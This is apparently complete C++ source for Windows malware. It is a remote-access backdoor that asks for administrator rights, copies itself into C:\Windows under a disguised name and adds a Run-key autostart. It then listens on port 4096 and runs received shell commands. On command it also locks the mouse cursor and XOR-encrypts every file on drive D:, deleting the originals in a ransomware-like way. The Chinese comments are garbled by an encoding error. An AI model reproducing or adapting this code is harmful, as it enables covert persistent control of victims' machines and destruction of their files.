#define _AFXDLL
#include <fstream>
#include <thread>
#include <TCHAR.h>
#include <afxext.h>
#include <winsock2.h>
#include <windows.h>
#include <mmsystem.h>
#include "resource.h"
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
using namespace std;

void encryption(char ExePath[]);
void traverFile(char *pathName);

string CheckIP() {
	WSADATA wsaData;
	char name[255];
	char* ip;
	PHOSTENT hostinfo;
	string ipStr;

	if (!WSAStartup(MAKEWORD(2, 0), &wsaData)) {
		if (!gethostname(name, sizeof(name))) {
			if ((hostinfo = gethostbyname(name)) != NULL) {
				ip = inet_ntoa(*(struct in_addr*)*hostinfo->h_addr_list);
				ipStr = ip;
			}
		}
		WSACleanup();
	}
	return ipStr;
}

int clip(bool lockb = false) {
	RECT rect = {};
	rect.bottom = 1;
	rect.right = 1;
	if (lockb) return ClipCursor(&rect);
	else return ClipCursor(NULL);
}

void GainAdminPrivileges(CString strApp) {
	SHELLEXECUTEINFO execinfo;
	memset(&execinfo, 0, sizeof(execinfo));
	execinfo.lpFile = strApp;
	execinfo.cbSize = sizeof(execinfo);
	execinfo.lpVerb = _T("runas");
	execinfo.fMask = SEE_MASK_NO_CONSOLE;
	execinfo.nShow = SW_SHOWDEFAULT;

	ShellExecuteEx(&execinfo);
}

BOOL ExeIsAdmin() {
#define ACCESS_READ 1
#define ACCESS_WRITE 2
	HANDLE hToken;
	DWORD dwStatus;
	DWORD dwAccessMask;
	DWORD dwAccessDesired;
	DWORD dwACLSize;
	DWORD dwStructureSize = sizeof(PRIVILEGE_SET);
	PACL pACL = NULL;
	PSID psidAdmin = NULL;
	BOOL bReturn = FALSE;
	PRIVILEGE_SET ps;
	GENERIC_MAPPING GenericMapping;
	PSECURITY_DESCRIPTOR psdAdmin = NULL;
	SID_IDENTIFIER_AUTHORITY SystemSidAuthority = SECURITY_NT_AUTHORITY;

	if (!ImpersonateSelf(SecurityImpersonation))
		goto LeaveIsAdmin;

	if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken)) {
		if (GetLastError() != ERROR_NO_TOKEN)
			goto LeaveIsAdmin;

		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
			goto LeaveIsAdmin;

		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
			goto LeaveIsAdmin;
	}

	if (!AllocateAndInitializeSid(&SystemSidAuthority, 2,
		SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0, &psidAdmin))
		goto LeaveIsAdmin;

	psdAdmin = LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
	if (psdAdmin == NULL)
		goto LeaveIsAdmin;

	if (!InitializeSecurityDescriptor(psdAdmin,
		SECURITY_DESCRIPTOR_REVISION))
		goto LeaveIsAdmin;

	dwACLSize = sizeof(ACL) + sizeof(ACCESS_ALLOWED_ACE) +
		GetLengthSid(psidAdmin) - sizeof(DWORD);

	pACL = (PACL)LocalAlloc(LPTR, dwACLSize);
	if (pACL == NULL)
		goto LeaveIsAdmin;

	if (!InitializeAcl(pACL, dwACLSize, ACL_REVISION2))
		goto LeaveIsAdmin;

	dwAccessMask = ACCESS_READ | ACCESS_WRITE;

	if (!AddAccessAllowedAce(pACL, ACL_REVISION2, dwAccessMask, psidAdmin))
		goto LeaveIsAdmin;

	if (!SetSecurityDescriptorDacl(psdAdmin, TRUE, pACL, FALSE))
		goto LeaveIsAdmin;

	if (!SetSecurityDescriptorGroup(psdAdmin, psidAdmin, FALSE))
		goto LeaveIsAdmin;
	if (!SetSecurityDescriptorOwner(psdAdmin, psidAdmin, FALSE))
		goto LeaveIsAdmin;

	if (!IsValidSecurityDescriptor(psdAdmin))
		goto LeaveIsAdmin;

	dwAccessDesired = ACCESS_READ;

	GenericMapping.GenericRead = ACCESS_READ;
	GenericMapping.GenericWrite = ACCESS_WRITE;
	GenericMapping.GenericExecute = 0;
	GenericMapping.GenericAll = ACCESS_READ | ACCESS_WRITE;

	if (!AccessCheck(psdAdmin, hToken, dwAccessDesired,
		&GenericMapping, &ps, &dwStructureSize, &dwStatus, &bReturn))
		goto LeaveIsAdmin;

	if (!RevertToSelf())
		bReturn = FALSE;
LeaveIsAdmin:
	if (pACL) LocalFree(pACL);
	if (psdAdmin) LocalFree(psdAdmin);
	if (psidAdmin) FreeSid(psidAdmin);

	return bReturn;
}

int main() {
	char ExePath_c[MAX_PATH] = {};
	GetModuleFileName(NULL, ExePath_c, MAX_PATH);
	string ExePath_str = ExePath_c;

	string::size_type pos = 0;
	while ((pos = ExePath_str.find('\\', pos)) != string::npos) {
		ExePath_str.insert(pos, "\\");
		pos = pos + 2;
	}

	char ExePath[MAX_PATH] = {};
	for (int i = 0; i < ExePath_str.size(); i++)
		ExePath[i] = ExePath_str[i];

	CString ExePath_cstr = ExePath;
	if (!ExeIsAdmin()) GainAdminPrivileges(ExePath_cstr);

	// �������Լ����Ƶ� C:\\Windows\\ ��
	DWORD dwAttrib = GetFileAttributes("C:\\Windows\\Client.exe");
	if (!(INVALID_FILE_ATTRIBUTES != dwAttrib && 0 == (dwAttrib & FILE_ATTRIBUTE_DIRECTORY))) {
		CopyFile(ExePath, "C:\\Windows\\Client.exe", TRUE);
		system("start C:\\Windows\\Client.exe");
		return 0;
	}

	// �����Զ�������ɾ��Ҳ��
	HKEY hKey;
	RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
	RegSetValueEx(hKey, "Windows���ⷴ��", 0, REG_SZ, (const BYTE*)"C:\\Windows\\Client.exe", MAX_PATH);     // αװ�Լ��õ�
	RegCloseKey(hKey);

	while (true) {
		WSADATA wsdata;
		WSAStartup(MAKEWORD(2, 2), &wsdata);
 
		SOCKET hServSock = socket(PF_INET, SOCK_STREAM, 0);
 
		SOCKADDR_IN servAddr;
		servAddr.sin_family = AF_INET;
		servAddr.sin_addr.s_addr = htonl(INADDR_ANY);
		servAddr.sin_port = htons(4096);
		bind(hServSock, (SOCKADDR*)&servAddr, sizeof(servAddr));
 
		listen(hServSock, 5);
 
		SOCKADDR_IN clntAddr;
		int clntAddrSz = sizeof(clntAddr);
		SOCKET hSock = accept(hServSock, (SOCKADDR*)&clntAddr, &clntAddrSz);
		send(hSock, CheckIP().c_str(), 1024, 0);
		send(hSock, CheckIP().c_str(), 1024, 0);

		int x;
		bool b = true;
		string str;
		char s[1024] = {};
		while (recv(hSock, s, 1024, 0) != -1) {
			x = atoi(s);
			if (x == 1) {
				recv(hSock, s, 1024, 0);
				system(s);
			}
			else if (x == 2) {
				char title[1024];
				char message[1024];
				recv(hSock, title, 1024, 0);
				recv(hSock, message, 1024, 0);
				MessageBox(NULL, message, title, MB_OK);
			}
			else if (x == 3) traverFile((char*)"D:");
			else if (x == 4)
				PlaySound((LPCSTR)IDR_WAVE1, NULL, SND_RESOURCE | SND_ASYNC | SND_LOOP);
			else if (x == 5)  {
				clip(b);
				b = !b;
			}
			else if (x == 6) break;
			send(hSock, CheckIP().c_str(), 1024, 0);
		}

		closesocket(hSock);
	}
	return 0;
}

// ���ڼ����ļ��ĺ���
void encryption(char ExePath[]) {
	fstream BeforeFile, AfterFile;
	BeforeFile.open(ExePath, ios::in | ios::binary);
	AfterFile.open("C:\\Windows\\save.exe", ios::out | ios::binary);

	BeforeFile.seekg(0, ios::end);
	streamoff size = BeforeFile.tellg();
	BeforeFile.seekg(0, ios::beg);

	string key = "�������ü������룡";
	int j = 0;
	for (streamoff i = 0; i < size; i++) {
		AfterFile.put(BeforeFile.get() ^ key[j]);
		if (j + 1 == key.size()) j = 0;
		else j++;
	}

	BeforeFile.close();
	AfterFile.close();

	remove(ExePath);
	CopyFile("C:\\Windows\\save.exe", ExePath, TRUE);
	remove("C:\\Windows\\save.exe");
}

// ����Ѱ��ĳ�ļ����������ļ��ĺ���
void traverFile(char *pathName) {
	WIN32_FIND_DATA findData;
	char buff[MAX_PATH];
	char temp[MAX_PATH];
	sprintf(buff, "%s\\\\*.*", pathName);


	HANDLE hFile = FindFirstFile(buff, &findData);
	if (INVALID_HANDLE_VALUE == hFile) return;

	BOOL isContinue = true;
	while (isContinue) {
		memset(temp, 0, MAX_PATH);
		sprintf(temp, "%s\\\\%s", pathName, findData.cFileName);

		if (FILE_ATTRIBUTE_DIRECTORY == findData.dwFileAttributes) {
			if (strcmp(".", findData.cFileName) && strcmp("..", findData.cFileName)) {
				traverFile(temp);
			}
		}
		else encryption(temp);

		isContinue = FindNextFile(hFile, &findData);
	}
}